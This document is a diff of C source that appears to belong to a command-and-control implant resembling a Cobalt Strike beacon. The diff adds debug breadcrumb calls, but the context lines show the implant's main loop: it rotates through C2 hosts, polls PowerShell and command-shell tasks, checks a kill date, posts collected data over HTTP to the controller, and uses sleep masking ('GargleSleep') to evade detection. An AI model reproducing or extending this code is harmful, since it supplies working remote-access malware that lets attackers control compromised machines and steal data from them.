@@ -146,6 +146,7 @@ void beacon(LPVOID lpReserved) {
 	x86_bc("after agent_init");
 
 	while (sleep_time > 0) {
+		x86_bc("loop");
 		// dlog("beacon.beacon - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n");
 
 		_snprintf(beacon_domain, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
@@ -209,6 +210,7 @@ void beacon(LPVOID lpReserved) {
 
 			/* 检查我们的powershell实例 */
 			psh_poll(command_shell_callback, MAX_PACKET);
+			x86_bc("after polls");
 
 			/* 检查终止日期 */
 			if (check_kill_date())
@@ -216,12 +218,14 @@ void beacon(LPVOID lpReserved) {
 
 			/* 如果有任何内容要发送，现在就执行--一次性操作 */
 			if (http_post_len > 0) {
+				x86_bc("before post_maybe");
 				/* 使用新的HTTP连接--反正Web服务器会关闭连接 */
 				http_close();
 				http_init(beacon_domain, port, ua);
 
 				/* 好，现在发送我们的数据 */
 				http_post_maybe(post_url);
+				x86_bc("after post_maybe");
 			}
 		}
 		else {
@@ -259,12 +263,14 @@ void beacon(LPVOID lpReserved) {
 			    }
 
     			// dlog("beacon.beacon - Ready to GargleSleep! Sleep Time: %u Jitter: %u Adjustment: %u sxjd100: %u \n", sleep_time, jitter, adjust, sxjd100);
+				x86_bc("before GargleSleep jitter");
 				if (adjust < sleep_time) {
 					GargleSleep(sleep_time - adjust);
 				} else {
 				    // Not sure how we got here, but we should probably still try to sleep...
 					GargleSleep(sleep_time);
 				}
+				x86_bc("after GargleSleep jitter");
 			}
 		}
 	}
